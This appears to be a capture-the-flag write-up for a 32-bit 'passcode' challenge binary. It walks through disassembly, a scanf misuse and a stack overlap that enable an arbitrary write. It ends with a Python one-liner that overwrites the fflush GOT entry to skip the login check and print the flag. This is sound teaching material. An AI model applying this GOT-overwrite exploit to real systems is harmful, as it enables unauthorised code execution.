# Solution

First thing to do is examine the binary we get:
```
$ file ./passcode

./passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
```

It's a 32-bit linux executable. Disaassembling main gives us some assembly:
```
/ (fcn) sym.main 50
|   sym.main ();
|           ; JMP XREF from 0x080484c7 (entry0)
|           ; DATA XREF from 0x080484c7 (entry0)
|           0x08048665      55             push ebp
|           0x08048666      89e5           mov ebp, esp
|           0x08048668      83e4f0         and esp, 0xfffffff0
|           0x0804866b      83ec10         sub esp, 0x10
|           0x0804866e      c70424f08704.  mov dword [esp], str.Toddler_s_Secure_Login_System_1.0_beta. ; [0x80487f0:4]=0x64646f54 LEA str.Toddler_s_Secure_Login_System_1.0_beta. ; "Toddler's Secure Login System 1.0 beta." @ 0x80487f0
|           0x08048675      e8d6fdffff     call sym.imp.puts          ; int puts(const char *s);
|           0x0804867a      e88affffff     call sym.welcome
|           0x0804867f      e8e0feffff     call sym.login             ; floating_point log(arithmetic x);
|           0x08048684      c70424188804.  mov dword [esp], str.Now_I_can_safely_trust_you_that_you_have_credential_:_ ; [0x8048818:4]=0x20776f4e LEA str.Now_I_can_safely_trust_you_that_you_have_credential_:_ ; "Now I can safely trust you that you have credential :)" @ 0x8048818
|           0x0804868b      e8c0fdffff     call sym.imp.puts          ; int puts(const char *s);
|           0x08048690      b800000000     mov eax, 0
|           0x08048695      c9             leave
\           0x08048696      c3             ret
```

`main()` makes a call to welcome, which asks the user for a name, and to login, which asks them for 
2 passcodes. Looking at the source code, we see that the values of these 2 passcodes should be 
338150 and 13371337. Trying these leads to an unexpected segfault. 


The seg fault is a result of an error in the login function. The function `scanf()` takes an _address_
as it's second parameter, and the author has passed an actual integer to this. This means that scanf
will be place the user's input into the address denoted by `passcode1`, which is an unitialized int. 
If we can write to the memory that `passcode1` occupies before the scanf, we can essentially write 
any value to any address in memory. 


To do this we can use the `welcome()` function. Welcome will read up to 100 characters and place them
into a chunk of memory on the stack. When welcome pops off the stack, that area will be reused for the 
call to `login()`. This means that `passcode1` should be initialized to some value that was set in the
`scanf()` used in `welome()`. 


We need to figure out where the overlap will occur on the stack. The bytes for the user's name starts
at `$ebp-0x70`, while the bytes for `passcode1` are held at `$ebp-0x10`. Since ebp will be the same for
each function, the overlap will occur at `$ebp-(0x70 - 0x10) = $ebp-0x60`. This means we will have to write
0x60 bytes (96 characters) of random data before writing a 4-byte address that will populate `passcode1`. 


Knowing we can now write any value to an arbitrary location in memory, we can redirect code execution with
a return-to-libc attack. Looking at the disassembly for login shows:
```
 (fcn) sym.login 165
|   sym.login ();
|           ; var int local_10h @ ebp-0x10
|           ; var int local_ch @ ebp-0xc
|           ; var int local_4h @ esp+0x4
|           ; CALL XREF from 0x0804867f (sym.main)
|           0x08048564      55             push ebp
|           0x08048565      89e5           mov ebp, esp
|           0x08048567      83ec28         sub esp, 0x28               ; '('
|           0x0804856a      b870870408     mov eax, str.enter_passcode1_: ; "enter passcode1 : " @ 0x8048770
|           0x0804856f      890424         mov dword [esp], eax
|           0x08048572      e8a9feffff     call sym.imp.printf        ; int printf(const char *format,  ...);
|           0x08048577      b883870408     mov eax, 0x8048783          ; "%d"
|           0x0804857c      8b55f0         mov edx, dword [ebp - local_10h]
|           0x0804857f      89542404       mov dword [esp + local_4h], edx
|           0x08048583      890424         mov dword [esp], eax
|           0x08048586      e815ffffff     call sym.imp.__isoc99_scanf; int scanf(const char *format,  ...);
|           0x0804858b      a12ca00408     mov eax, dword [obj.stdin]  ; [0x804a02c:4]=0x3a434347 LEA obj.stdin ; "GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3" @ 0x804a02c
|           0x08048590      890424         mov dword [esp], eax
|           0x08048593      e898feffff     call sym.imp.fflush        ; int fflush(FILE *stream);
|           0x08048598      b886870408     mov eax, str.enter_passcode2_: ; "enter passcode2 : " @ 0x8048786
|           0x0804859d      890424         mov dword [esp], eax
|           0x080485a0      e87bfeffff     call sym.imp.printf        ; int printf(const char *format,  ...);
|           0x080485a5      b883870408     mov eax, 0x8048783          ; "%d"
|           0x080485aa      8b55f4         mov edx, dword [ebp - local_ch]
|           0x080485ad      89542404       mov dword [esp + local_4h], edx
|           0x080485b1      890424         mov dword [esp], eax
|           0x080485b4      e8e7feffff     call sym.imp.__isoc99_scanf; int scanf(const char *format,  ...);
|           0x080485b9      c70424998704.  mov dword [esp], str.checking... ; [0x8048799:4]=0x63656863 LEA str.checking... ; "checking..." @ 0x8048799
|           0x080485c0      e88bfeffff     call sym.imp.puts          ; int puts(const char *s);
|           0x080485c5      817df0e62805.  cmp dword [ebp - local_10h], 0x528e6 ; [0x528e6:4]=-1
|       ,=< 0x080485cc      7523           jne 0x80485f1
|       |   0x080485ce      817df4c907cc.  cmp dword [ebp - local_ch], 0xcc07c9 ; [0xcc07c9:4]=-1
|      ,==< 0x080485d5      751a           jne 0x80485f1
|      ||   0x080485d7      c70424a58704.  mov dword [esp], str.Login_OK_ ; [0x80487a5:4]=0x69676f4c LEA str.Login_OK_ ; "Login OK!" @ 0x80487a5
|      ||   0x080485de      e86dfeffff     call sym.imp.puts          ; int puts(const char *s);
|      ||   0x080485e3      c70424af8704.  mov dword [esp], str._bin_cat_flag ; [0x80487af:4]=0x6e69622f LEA str._bin_cat_flag ; "/bin/cat flag" @ 0x80487af
|      ||   0x080485ea      e871feffff     call sym.imp.system        ; int system(const char *string);
|      ||   0x080485ef      c9             leave
|      ||   0x080485f0      c3             ret
|      ||   ; JMP XREF from 0x080485cc (sym.login)
|      ||   ; JMP XREF from 0x080485d5 (sym.login)
|      ``-> 0x080485f1      c70424bd8704.  mov dword [esp], str.Login_Failed_ ; [0x80487bd:4]=0x69676f4c LEA str.Login_Failed_ ; "Login Failed!" @ 0x80487bd
|           0x080485f8      e853feffff     call sym.imp.puts          ; int puts(const char *s);
|           0x080485fd      c70424000000.  mov dword [esp], 0
\           0x08048604      e877feffff     call sym.imp.exit          ; void exit(int status);
```

There is a call to fflush that we can hijack and use to jump to address 0x080485d7 which will bypass
the passcode checks. To do this, we need to know the address of fflush in the global offset table and
overwrite it with the address 0x080485d7 as to redirect calls to fflush there. To find the address in the
global offset table we can do:
```
$ objdump -R ./passcode

./passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

The address for fflush is at 0804a004. Knowing this, we can build the exploit string. 
The string will consist of the 96 random characters, followed by the byte string for 
the address of fflush (0x0804a004). Then, we will write the string of the address for
where fflush should redirect code to, which is "0x080485d7". In python, this string
looks like:
```
$ python -c "print 'A'*96 + '\x04\xa0\x04\x08' + str(0x080485d7)"
```

